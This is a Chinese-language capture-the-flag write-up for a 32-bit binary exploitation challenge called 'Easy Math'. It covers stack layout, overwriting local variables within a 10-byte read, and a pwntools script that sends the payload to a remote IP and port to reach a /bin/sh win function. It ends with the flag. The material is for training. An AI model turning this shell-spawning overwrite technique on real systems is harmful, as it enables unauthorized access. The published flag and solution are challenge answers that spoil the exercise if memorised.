
# CTF 深度解析：南韓 - Easy Math (PWN)

| 屬性 | 規格 |
| :--- | :--- |
| **難度分級** | 40 Pts (Medium-Easy) |
| **核心漏洞** | 區域變數改寫 (Local Variable Overwrite) |
| **防禦機制** | i386 (32-bit), NX Enable, No Canary, No PIE |
| **關鍵工具** | `gdb`, `pwntools`, `nm`, `python3` |

---

## 1. 靜態分析：尋找「後門」與「地雷」

首先，我們透過 `nm` 指令發現了隱藏函數 `shell`。

### A. 後門函數 (`shell`)
使用 `disas shell` 可以看到這是一個標準的「Win Function」：
```nasm
0x080484b4 <+9>:  push   $0x8048650  ; "/bin/sh" 字串的位址
0x080484b9 <+14>: call   0x8048380 <system@plt>
```
這代表我們的目標只有一個：**讓程式執行 `call shell` 或者跳轉到 `0x080484ab`。**

### B. 核心邏輯地雷
觀察 `main` 函數的反組譯，程式在讀取你的輸入之前，先在 Stack（棧）上設置了兩道保險：
1. **變數初始化**：
   - `var_A` (`ebp-0xc`) = `$0xdeadbeef$`
   - `var_B` (`ebp-0x10`) = `$0xb228e661 \oplus 0x42234223 = 0xf00ba442$`
2. **通關條件**：
   - 在 `main+211` 處，程式檢查 `var_A` 是否等於 `$0x1337b00b$`。如果是，則 `call shell`。

---

## 2. 漏洞剖析：為什麼 ROP 行不通？

這是這題最陰險的地方。程式使用的輸入函數是：
`read(0, ebp-0x12, 0xa)` (從 `ebp-18` 開始讀取，長度僅 **10** 位元組)。



### 棧空間佈局 (Stack Layout)
| 位址 | 內容 | 說明 |
| :--- | :--- | :--- |
| `ebp + 4` | **Return Address** | 傳統 ROP 目標 (距離輸入點 22 bytes) |
| `ebp + 0` | Saved EBP | 4 bytes |
| `ebp - 0xc` | **var_A** | **目標校驗變數 (距離輸入點 6 bytes)** |
| `ebp - 0x10` | **var_B** | **校驗輔助變數 (距離輸入點 2 bytes)** |
| `ebp - 0x12` | **Buffer** | **輸入起點 (只能寫 10 bytes)** |

**結論：** 因為 `read` 限制 10 位元組，我們根本**摸不到**位在 22 位元組外的 Return Address。但這 10 個位元組剛好足夠我們改寫緊鄰的 `var_B` 和 `var_A`。

---

## 3. 攻擊策略：精密的變數修補

如果我們直接填入 10 個 `A`，雖然能改寫 `var_A`，但也會把 `var_B` 弄壞。而程式在檢查 `var_A` 之前，會先對 `var_B` 進行一段數學運算並驗證。

### A. 逆向數學運算
程式碼 `main+93` 到 `main+105` 執行的邏輯如下：
$$(var\_B - 0x12345678) = 0x5017145b$$

我們必須填入一個「修正後」的 `var_B`，讓它在被程式減掉 `$0x12345678$` 之後，依然能通過檢查。
$$目標值 = 0x5017145b + 0x12345678 = 0x624b6ad3$$

### B. Payload 構造
為了完美達成攻擊，Payload 必須精確對齊：
1. **Junk (2 bytes)**: 填補 `ebp-0x12` 到 `ebp-0x10` 的空隙。
2. **var_B (4 bytes)**: 填入 `\xd3\x6a\x4b\x62` (Little-endian)。
3. **var_A (4 bytes)**: 填入 `\x0b\xb0\x37\x13` (觸發後門的關鍵值)。



---

## 4. Exploit 實作 (pwntools)

```python
from pwn import *

# 1. 建立連線
r = remote('140.117.80.61', 4445)

# 2. 準備數值
# 讓 (X - 0x12345678) == 0x5017145b
target_var_b = 0x624b6ad3 
# 觸發 call shell 的關鍵值
target_var_a = 0x1337b00b 

# 3. 構造 Payload (精確 10 bytes)
payload = b'AA'             # Padding 抵達 ebp-0x10
payload += p32(target_var_b) # 覆蓋 var_B
payload += p32(target_var_a) # 覆蓋 var_A

# 4. 發動攻擊
r.sendlineafter(b'>', payload)

# 5. 取得控制權
r.interactive()
```

---

## 5. 反思與總結

這題「南韓 - Easy Math」教會了我們兩件關於 PWN 的核心觀念：

1. **不要預設攻擊路徑**：不是所有的溢位都是為了蓋 EIP。在現代防禦機制（如位址隨機化 ASLR 或 Canary）越來越強的情況下，改寫「控制流程變數（Control Variables）」往往比 ROP 更隱蔽且有效。
2. **精確度（Precision）是關鍵**：在有限的溢位空間內（如本題僅 10 bytes），你必須對 Stack Frame 的結構瞭若指掌。這也是為什麼 `disas` 和 `gdb` 的動態分析如此重要。

**🚩 FLAG: `FLAG{PWNpwnPWNponPONBON}`**
